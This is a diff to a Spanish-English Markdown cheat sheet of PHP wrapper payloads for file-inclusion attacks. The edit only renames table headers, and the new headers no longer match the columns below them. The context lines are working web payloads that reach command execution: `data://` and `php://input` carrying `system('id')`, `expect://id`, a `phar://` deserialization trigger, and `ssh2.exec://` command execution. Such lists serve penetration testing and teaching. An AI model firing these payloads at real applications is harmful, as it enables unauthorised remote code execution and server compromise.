@@ -23,7 +23,7 @@ linked:
 
 ## `data://` URI
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | Embed payload directly in URI; no remote server needed. | Standalone. |
 | Plain text data | `?page=data://text/plain,<?php system('id'); ?>` | Standard. |
@@ -57,7 +57,7 @@ ___
 
 ## `php://input` (POST Body)
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | Read PHP code from POST body via `php://input` | Body-based. |
 | Standard usage | `?page=php://input` con body `<?php system('id'); ?>` | Two-stage. |
@@ -87,7 +87,7 @@ ___
 
 ## `expect://` (RCE Direct)
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | PHP `expect` extension directly executes shell command | RCE direct. |
 | Standard | `?page=expect://id` | Direct RCE. |
@@ -105,7 +105,7 @@ ___
 
 ## `phar://` Deserialization Trigger
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | Phar archives contain serialized metadata. `phar://` access triggers `unserialize()` → if metadata controlled → Insecure Deserialization → RCE. | Combo vector. |
 | Standard | `?page=phar://path/file.phar` | Trigger. |
@@ -141,7 +141,7 @@ ___
 
 ## `ssh2://` y Otros
 
-| **Wrapper** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `ssh2.shell://` | `?page=ssh2.shell://user:pass@host:port/sh.cmd` | If ssh2 ext installed. |
 | `ssh2.exec://` | `?page=ssh2.exec://user:pass@host/command` | Direct command exec. |
